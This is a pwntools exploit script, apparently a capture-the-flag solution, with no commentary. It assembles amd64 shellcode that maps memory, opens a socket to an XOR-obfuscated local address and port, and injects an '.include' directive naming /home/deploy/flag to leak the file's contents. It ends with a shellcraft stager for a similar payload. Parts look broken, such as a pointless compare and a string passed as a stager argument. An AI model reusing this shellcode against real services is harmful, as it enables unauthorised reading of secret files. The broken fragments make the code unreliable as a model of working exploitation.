from pwn import *

context.arch = "amd64"

code = """call str1
.string "stack address @ 0x000\\n"
str1:
pop rsi
mov rdi, 1
mov rdx, 22
mov rax, 1
syscall

mov rdi, 0xdead000
mov rsi, 0x4000
mov rdx, 0x7
mov r10, 0x31
mov r8, 0
mov r9, 0
mov rax, 9
syscall

mov rdi, 0
mov rsi, 0xdeae000
mov rdx, 1000
mov rax, 0
syscall

push 0x29
pop rax
push 2
pop rdi
push 1
pop rsi
cdq 
syscall 
mov r12, rax
movabs rax, 0x201010101010101
push rax
movabs rax, 0x301017e687b0103
xor qword ptr [rsp], rax
push 0x2a
pop rax
mov rdi, r12
push 0x10
pop rdx
mov rsi, rsp
syscall 

call dick
.string "1\\n.include \\"/home/deploy/flag\\"@"
dick:
pop rsi
mov rdi, r12
mov rdx, 31
push 1
pop rax
syscall
mov rdi, r12
mov rsi, 0xdead000
mov rdx, 1000
xor eax, eax
syscall
add rsi, 4
cmp rsi, 10
call dick2
.string "Hooray! A custom ELF is executed!\\n"
dick2:
pop rsi
mov rdi, r12
mov rdx, 34
push 1
pop rax
syscall
bad:
xor edi, edi
push 60
pop rax
syscall
"""

sice = asm(code, extract=False)
print(sice)
a = open(sice, "rb").read()
print(len(a))
os.system("mv {} ./win".format(sice))


payload = "1\n.include \"/tmp/flag.txt\""

# print(eval(payload))
print(shellcraft.stager(payload, 0x4000))
print(asm(shellcraft.stager(payload, 0x4000)))

